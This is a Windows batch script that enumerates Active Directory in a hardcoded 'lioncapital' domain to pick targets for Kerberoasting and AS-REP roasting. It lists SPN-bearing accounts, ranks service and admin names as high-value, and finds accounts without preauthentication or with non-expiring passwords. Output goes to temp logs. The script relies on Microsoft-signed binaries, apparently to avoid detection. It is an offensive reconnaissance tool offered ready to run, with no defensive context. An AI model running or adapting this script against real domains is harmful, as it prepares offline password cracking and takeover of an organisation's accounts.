@echo off
setlocal enabledelayedexpansion
REM ============================================
REM  1_Kerberoast_ASREP.bat - SPN + AS-REP enumeration via dsquery.exe
REM  ALL SIGNED MS BINARIES: dsquery.exe  dsget.exe  findstr.exe  certutil.exe  type
REM  Replaces custom C# LDAP code with Microsoft-signed binaries.
REM  Output: %TEMP%\kerb_*.log
REM ============================================

set "OUT=%TEMP%"
set "DOM=lioncapital"

echo.
echo === SPN (Kerberoastable) ACCOUNTS via dsquery.exe ===
echo --- Method: dsquery user with servicePrincipalName attribute ---
echo --- Output: %OUT%\kerb_spn.log ---

:: Find all users with SPN attribute set (= Kerberoastable)
dsquery.exe * "DC=%DOM%,DC=local" -filter "(&(objectCategory=user)(objectClass=user)(servicePrincipalName=*))" -attr samaccountname serviceprincipalname distinguishedname -limit 0 > "%OUT%\kerb_spn.log" 2>&1

echo.
echo --- Counting accounts ---
findstr /c:"samaccountname" "%OUT%\kerb_spn.log" | find /c /v "" > "%OUT%\kerb_spn_count.txt"
type "%OUT%\kerb_spn_count.txt"

echo.
echo --- High-value SPN accounts (svc-, sa-, service-, admin-, backup-, sql-) ---
findstr /i "svc- sa- service- backup- sql- admin- iops- svc_" "%OUT%\kerb_spn.log" > "%OUT%\kerb_spn_priority.log"
type "%OUT%\kerb_spn_priority.log"

echo.
echo === AS-REP ROASTABLE ACCOUNTS (no preauth) ===
echo --- Method: dsquery filter userAccountControl bit 0x400000 ---
echo --- Output: %OUT%\kerb_asrep.log ---

:: UAC flag 0x400000 = DONT_REQUIRE_PREAUTH (4194304 decimal)
dsquery.exe * "DC=%DOM%,DC=local" -filter "(&(objectCategory=user)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" -attr samaccountname useraccountcontrol distinguishedname -limit 0 > "%OUT%\kerb_asrep.log" 2>&1

echo --- Result ---
type "%OUT%\kerb_asrep.log"

echo.
echo === PASSWORD NEVER EXPIRES ACCOUNTS ===
echo --- Method: dsquery filter userAccountControl bit 0x10000 ---
dsquery.exe * "DC=%DOM%,DC=local" -filter "(&(objectCategory=user)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" -attr samaccountname useraccountcontrol -limit 0 > "%OUT%\kerb_never_expires.log" 2>&1
echo --- Result ---
type "%OUT%\kerb_never_expires.log"

echo.
echo === ALL DOMAIN USERS (for thorough Kerberoast list) ===
dsquery.exe user "DC=%DOM%,DC=local" -limit 0 > "%OUT%\kerb_all_users.log" 2>&1
echo --- Total users ---
find /c /v "" < "%OUT%\kerb_all_users.log"

echo.
echo === Done. Files in %OUT% ===
dir "%OUT%\kerb_*"
pause
endlocal
